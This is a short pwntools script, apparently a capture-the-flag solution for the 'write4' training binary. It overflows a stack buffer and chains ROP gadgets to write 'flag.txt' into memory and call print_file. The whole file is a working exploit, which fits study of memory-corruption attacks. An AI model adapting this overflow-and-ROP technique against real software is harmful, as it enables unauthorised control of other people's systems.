from pwn import *

elf = ELF("./write4")
r = elf.process()

payload = b"a" * 40
payload += p64(0x0000000000400690) #<-- pop r14 ; pop r15 ; ret
payload += p64(0x601070)
payload += b"flag.txt"
payload += p64(0x0000000000400628) #<-- mov    QWORD PTR [r14],r15
payload += p64(0x0000000000400693) #<-- pop rdi ; ret
payload += p64(0x601070)
payload += p64(elf.sym["print_file"])

r.sendline(payload)
r.interactive()

# stack :
# pop r15  <--- "flag.txt"
# pop r14  <--- 0x601070
# mov    QWORD PTR [r14],r15
# ret
# pop rdi
# 0x601070
# ret
# print_file
